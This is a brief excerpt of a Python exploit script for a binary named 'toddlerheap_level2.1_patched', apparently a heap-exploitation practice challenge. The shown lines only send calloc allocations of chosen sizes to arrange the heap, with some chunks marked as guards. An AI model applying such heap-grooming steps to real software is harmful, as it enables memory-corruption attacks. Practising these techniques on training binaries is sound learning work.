...
binary = './toddlerheap_level2.1_patched'
...
p.sendline(f"calloc 9 1432")


p.sendline(f"calloc 10 1432") # guarding


p.sendline(f"calloc 12 75") 
p.sendline(f"calloc 13 1432")


p.sendline(f"calloc 14 1432") # guarding
